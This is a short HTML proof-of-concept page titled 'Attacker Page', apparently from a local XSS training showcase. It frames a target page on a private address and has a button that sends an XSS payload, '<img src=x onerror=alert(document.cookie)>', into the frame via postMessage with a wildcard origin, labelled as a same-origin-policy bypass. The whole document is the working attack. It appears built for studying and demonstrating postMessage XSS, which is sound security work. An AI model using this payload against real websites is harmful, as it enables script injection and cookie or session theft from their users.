<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Attacker Page</title>
</head>
<body>
<iframe src="http://192.168.5.4/hack/xssshowcase/src/xss-showcase-107.php"></iframe>
<button onclick="frames[0].postMessage('<img src=x onerror=alert(document.cookie)>','*')">SOP Bypass Attack</button>
</body>
</html>